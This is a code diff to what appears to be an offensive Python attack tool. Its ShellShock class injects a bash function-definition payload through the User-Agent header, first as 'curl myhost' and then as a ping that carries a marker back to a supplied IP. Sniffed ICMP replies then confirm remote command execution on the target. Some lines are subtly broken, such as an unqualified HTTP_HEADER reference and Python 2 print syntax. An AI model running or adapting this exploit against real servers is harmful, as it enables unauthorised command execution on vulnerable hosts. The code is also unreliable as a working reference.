@@ -56,15 +56,21 @@ class DOS():
 
 # class Attack():
 
-class ShellShock(HTTP):#Attack):
-    HTTP_HEADER = {"User-Agent":"() { :; }; curl myhost"}
+class ShellShock():#Attack):
+    HTTP_HEADER = {"User-Agent":"() { :; }; ping -c 10 -p 5348454c4c5f53484f434b5f574f524b -s 24 "}
 
-    def __init__(self, host, script_page):
+    def __init__(self, host, script_page, ping_ip):
+        HTTP_HEADER['User-Agent'] += ping_ip
         self.host = HTTP(host, header=HTTP_HEADER)
         self.target = script_page
 
     def run(self):
-        self.host.GET(target)
+        self.host.GET(self.target)
+        pkts=sniff(filter="icmp", timeout=120,count=5)
+        for p in pkts:
+            if p[Raw].load[16:] == "SHELL_SHOCK_WORK":
+                print "Attaque réussie contre " + self.host
+                return True
 
 
 
